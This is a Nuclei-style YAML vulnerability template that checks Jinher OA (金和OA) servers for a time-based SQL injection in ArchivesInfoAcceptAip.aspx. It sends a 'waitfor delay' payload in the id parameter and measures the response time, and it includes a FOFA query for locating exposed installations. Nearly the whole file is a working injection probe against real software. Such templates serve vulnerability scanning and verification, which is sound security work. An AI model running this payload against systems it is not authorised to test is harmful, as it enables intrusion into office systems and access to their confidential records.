id: poc-yaml-jinher-archivesinfoacceptaip-aspx-sqli
info:
  name: 金和OA ArchivesInfoAcceptAip.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 金和OA
    fofa-query: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(1, 3)}}"
  t2: "{{to_number(t1) * 4}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/ArchivesInfoAcceptAip.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        condition: and
        words:
          - "收文信息"
          - "秘密等级"
          - "紧急程度"
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
